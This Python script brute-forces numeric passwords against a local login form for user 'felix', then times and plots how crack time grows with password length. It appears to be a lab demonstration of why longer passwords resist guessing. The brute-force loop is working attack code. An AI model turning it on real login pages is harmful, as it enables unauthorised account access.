import requests
import time
import os
import matplotlib.pyplot as plt

def gen_wordlist(low_length, high_length):
    if not os.path.exists("passlist.txt"):
        with open("passlist.txt", "a+") as f:
            for cur_len in range(low_length, high_length):
                low = int('1' + '0' * (cur_len - 1))
                high = int('9' * cur_len)
                for passwd in range(low, high + 1):
                    f.write(str(passwd) + '\n')

def brute():
    url = "http://localhost:8080/login.php"
    creds = {'user' : 'felix', 'password' : None}
    with open("passlist.txt", "r") as f:
        passwords = f.readlines()
    passwords = [x.strip() for x in passwords]
    now = time.time()
    timings = []
    for idx in range(len(passwords)):
        if len(passwords[idx-1]) < len(passwords[idx]):
            now = time.time()
        creds['password'] = passwords[idx]
        req = requests.post(url, data=creds)
        if 'Wrong' not in req.text:
            print("time: {0}; pass: {1}".format(time.time() - now, passwords[idx]))
            timings.append(time.time() - now)
    print(timings)
    return timings


def plotik(values, lengths):
    plt.plot(values, lengths)
    plt.ylabel('Length of password')
    plt.xlabel('Avg seconds to crack')
    plt.show()

def average(listi):
    return sum(listi) / len(listi)

def main(highest):
    lengths = [x for x in range(3, highest)]
    print(lengths[-1])
    gen_wordlist(lengths[0], lengths[-1]+1)
    values = brute()
    os.remove("passlist.txt")
    print("returned: {}".format(values))
    news = []
    for i in range(0, len(values), 3):
        news.append(average(values[i:i+3]))
    print(news)
    plotik(news, lengths)


if __name__ == '__main__':
    inp = int(input("enter highest length: "))
    main(inp)
